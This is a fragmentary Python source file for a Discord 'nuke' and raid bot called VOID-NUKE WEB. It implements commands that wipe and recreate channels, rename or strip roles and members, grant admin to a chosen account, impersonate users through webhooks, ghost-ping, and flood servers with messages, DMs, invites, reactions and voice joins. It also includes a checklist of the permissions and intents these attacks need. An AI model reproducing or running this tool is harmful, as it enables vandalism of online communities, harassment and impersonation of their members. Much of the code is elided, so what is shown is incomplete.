"""VOID-NUKE WEB - Complete Bot Core - 100% parity + permissions + audioop fix"""
...
import asyncio, random, gc, time, json, re, urllib.request
...
# Permission definitions - same as Discord
REQUIRED_PERMISSIONS = {
    ...
    "manage_channels": {"name": "Manage Channels", "desc": "Create/delete/rename channels", "needed_for": ["Del Channels", "Create Channels", "Rename Channels", "Nuke", "Auto Raid", "Clone"], "perm": "manage_channels"},
    ...
    "manage_messages": {"name": "Manage Messages", "desc": "Delete messages for ghost ping", "needed_for": ["Ghost Ping", "Spam cleanup"], "perm": "manage_messages"},
    ...
    "send_messages": {"name": "Send Messages", "desc": "Send messages in channels", "needed_for": ["Spam", "Thread Spam", "Spoiler", "Poll", "Event"], "perm": "send_messages"},
...
REQUIRED_INTENTS = {
    "members": {"name": "Server Members Intent", "required": True, "desc": "Needed for member list, ban/kick/mute/rename", "where": "Discord Dev Portal > Bot > Privileged Gateway Intents > Server Members Intent"},
    "message_content": {"name": "Message Content Intent", "required": True, "desc": "Needed for reading message content, webhook logger", "where": "Discord Dev Portal > Bot > Privileged Gateway Intents > Message Content Intent"},
    "presence": {"name": "Presence Intent", "required": False, "desc": "Not needed", "where": ""},
}
...
class LogBuffer:
    ...
    def add(self, level, msg):
        ...
        entry = {"ts": ts, "level": level, "msg": str(msg)[:600], "full": f"[{ts}] [{level}] {msg}"}
...
class BotManager:
    ...
    def __new__(cls):
        if cls._instance is None:
            ...
            cls._instance.bot=None; cls._instance.loop=None; cls._instance.guild_id=None
            cls._instance.connected=False; cls._instance.guild_info={}
        ...
        async def _wrap(coro):
            async with SEM:
                try: return await coro
                    ...
                    raise
                finally: await asyncio.sleep(0.25)
        results=[]
        chunk_size=8
    ...
    def check_permissions(self):
        ...
        me = g.me
        if not me:
            return {"error": "Bot member not found in guild", "has_guild": True}
        ...
        for key, info in REQUIRED_PERMISSIONS.items():
            ...
            results[key]={
                ...
                "has": has,
                "is_admin_bypass": perms.administrator and not perm_val,
            }
        # Intents check (we can only assume - we know what we requested)
        intents_status={
        ...
        return {
            ...
            "permissions": results,
            "intents": intents_status,
            "top_role": top_role.name if top_role else "None",
            "top_role_pos": top_role.position if top_role else 0,
...
async def _send_embed(target, everyone=False):
    ...
    except Exception as ex: log_err(str(ex)[:200])
...
async def cmd_nuke(self, params):
    ...
    log_ok(f"{len(new_chans)} ch ready")
    ...
    async def _raid_chan(chan):
        async with SEM:
            ...
            except Exception as e: log_err(f"#{chan.name} {str(e)[:80]}")
    await self._limited_gather([_raid_chan(c) for c in new_chans])
    log_ok(f"NUKE COMPLETE | {g.name}"); gc.collect()
...
async def cmd_create_cats(self, params):
    ...
    async def cc(i):
        async with SEM:
            try: await g.create_category(f"{name} {i+1}"); log_ok(f"{name} {i+1}"); return True
            except: return False
    ...
    async def rn(i,ch):
        async with SEM:
            if isinstance(ch,(discord.TextChannel,discord.VoiceChannel,discord.CategoryChannel)):
                try: await ch.edit(name=f"{name}-{i+1}"); log_ok(f"{name}-{i+1}"); return True
                except: return False
            return False
...
async def cmd_rename_roles(self, params):
    ...
    async def rr(i,r):
        async with SEM:
            try: await r.edit(name=f"{name}-{i+1}"); log_ok(f"@{name}-{i+1}"); return True
            except: return False
...
async def cmd_edit_server(self, params):
    ...
    except Exception as e: log_err(f"name {str(e)[:80]}")
    try: await g.edit(description=desc); log_ok("desc"); ok+=1
    except Exception as e: log_err(f"desc {str(e)[:80]}")
    if icon_url:
        try:
            with urllib.request.urlopen(icon_url) as res: await g.edit(icon=res.read())
            log_ok("icon"); ok+=1
        except Exception as e: log_err(f"icon {str(e)[:80]}")
...
async def cmd_rename_members(self, params):
    ...
    async def _n(m):
        async with SEM:
            if m.bot or m.id in NO_BAN_KICK_ID: return False
            try: await m.edit(nick=nick); log_ok(m.name); return True
            except: return False
...
async def cmd_fix_nicks(self, params):
    ...
    for m in g.members:
        ...
        if n and n[0] in special:
            ...
            try:
                async with SEM: await m.edit(nick=clean)
                log_ok(f"{n} -> {clean}"); ok+=1; await asyncio.sleep(0.3)
            except: fail+=1
...
async def cmd_get_admin(self, params):
    ...
    except Exception as e: return log_err(str(e)[:150])
    if not target:
        ...
        try: m=await g.fetch_member(int(target)); await m.add_roles(role); log_ok(f"{m.name} -> admin")
        except Exception as e: log_err(str(e)[:150])
...
async def cmd_impersonate(self, params):
    ...
    if cid_raw:
        try:
            ...
            if not cs or not isinstance(cs,discord.TextChannel): return log_err("channel not found")
            tc=[cs]
        except ValueError: return log_err("invalid channel ID")
    else: tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
    log_info(f"target {target.display_name} | {len(tc)} ch")
    ok=fail=0
    async with aiohttp.ClientSession() as session:
        for chan in tc:
            wh_obj=None
            try:
                async with SEM:
                    ...
                    await wh_obj.delete()
                log_ok(f"#{chan.name}"); ok+=1
            except Exception as e:
                log_err(str(e)[:100]); fail+=1
                if wh_obj:
...
async def cmd_ghost_ping(self, params):
    ...
    for m in g.members:
        ...
        try:
            ...
            log_ok(m.name); ok+=1; await asyncio.sleep(0.25)
        except: fail+=1
...
async def cmd_strip_roles(self, params):
    ...
    for m in g.members:
        ...
        try:
            async with SEM: await m.remove_roles(*removable)
            log_ok(f"{m.name} -{len(removable)} roles"); ok+=1
        except: fail+=1
...
async def cmd_dm_spam_user(self, params):
    ...
    try: count=min(int(params.get("count",5)),20)
    ...
    for i in range(count):
        try:
            async with SEM: await target.send(msg)
            log_ok(f"[{i+1}/{count}] {target.name}"); ok+=1
        except discord.Forbidden:
            log_err(f"DMs fermés — {target.name}"); fail+=count-i; break
...
async def cmd_webhook_spam(self, params):
    g=self.get_guild()
    if not g: return
    try: count=min(int(params.get("count",2)),5)
    except: count=2
    content=params.get("content",PUB)
    everyone=False
    if content.lower()=='embed': everyone=params.get("everyone","no").lower()=='yes'
    ...
    async def _send_wh(wh,count,content,everyone):
        async with SEM:
            ...
            try:
                ...
                log_ok(f"wh {wh.name}")
            except Exception as e: log_err(str(e)[:100])
...
async def cmd_server_info(self, params):
    ...
    bans=[e async for e in g.bans()]
    info={
        "name":g.name,"id":str(g.id),"owner":str(g.owner),"members":g.member_count,
        "bans":len(bans),"channels":len(g.channels),
        ...
        "boosts":g.premium_subscription_count,"created":g.created_at.strftime('%Y-%m-%d'),
    }
...
async def cmd_webhook_logger(self, params):
    ...
    if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
        return log_err("Invalid webhook URL - must be discord.com/api/webhooks/...")
...
async def cmd_lockdown(self, params):
    ...
    async def lock(ch):
        async with SEM:
            try: await ch.set_permissions(g.default_role, send_messages=False); log_ok(f"#{ch.name}"); return True
            except: return False
    ...
    async def df(m):
        async with SEM:
            if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
                try: await m.edit(deafen=True); log_ok(m.name); return True
                except: return False
            return False
...
async def cmd_disconnect_all(self, params):
    ...
    async def dc(m):
        async with SEM:
            if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
                try: await m.move_to(None); log_ok(m.name); return True
                except: return False
            return False
...
async def cmd_mass_move(self, params):
    ...
    tid=params.get("target_id","")
    if not tid: return log_err("target VC ID required - use Channels API to get ID")
    try:
        target=g.get_channel(int(tid))
        if not target or not isinstance(target,discord.VoiceChannel): return log_err("target VC not found")
    except: return log_err("invalid target ID")
    async def mv(m):
        async with SEM:
            if m.voice and m.voice.channel:
                try: await m.move_to(target); log_ok(f"{m.name} -> #{target.name}"); return True
                except: return False
            return False
...
async def cmd_invite_spam(self, params):
    ...
    for _ in range(count):
        try:
            ...
            log_ok(inv.url); ok+=1; await asyncio.sleep(0.5)
        except Exception as e: log_err(str(e)[:100]); fail+=1
    log_ok(f"Invite Spam {ok}")

async def cmd_spam(self, params):
    g=self.get_guild()
    if not g: return
    try: count=min(int(params.get("count",3)),10)
    except: count=3
    content=params.get("content",PUB)
    everyone=False
    if content.lower()=='embed': everyone=params.get("everyone","no").lower()=='yes'
...
async def cmd_reaction_spam(self, params):
    g=self.get_guild()
    if not g: return
    try: limit=min(int(params.get("limit",5)),20)
    except: limit=5
    void_emojis=["🇻","🇴","🇮","🇩","🌀","💫","🗣","🔓","🔗"]
    ok=fail=0
    for chan in [c for c in g.channels if isinstance(c,discord.TextChannel)]:
...
async def cmd_vc_spam(self, params):
    g=self.get_guild()
    if not g: return
    try: loops=min(int(params.get("loops",2)),5)
    except: loops=2
    vcs=[c for c in g.channels if isinstance(c,discord.VoiceChannel)]
    ...
    for vc in vcs:
        for i in range(loops):
            try:
                async with SEM:
                    conn=await vc.connect(timeout=3.0); await asyncio.sleep(0.2); await conn.disconnect(force=True)
    ...
    for chan in [c for c in g.channels if isinstance(c,discord.TextChannel)]:
        for i in range(count):
            try:
                ...
                log_ok(f"#{chan.name} [{i+1}]"); ok+=1
            except Exception as e: log_err(str(e)[:120]); fail+=1
            await asyncio.sleep(0.5)
...
# Aliases for numeric IDs and old names
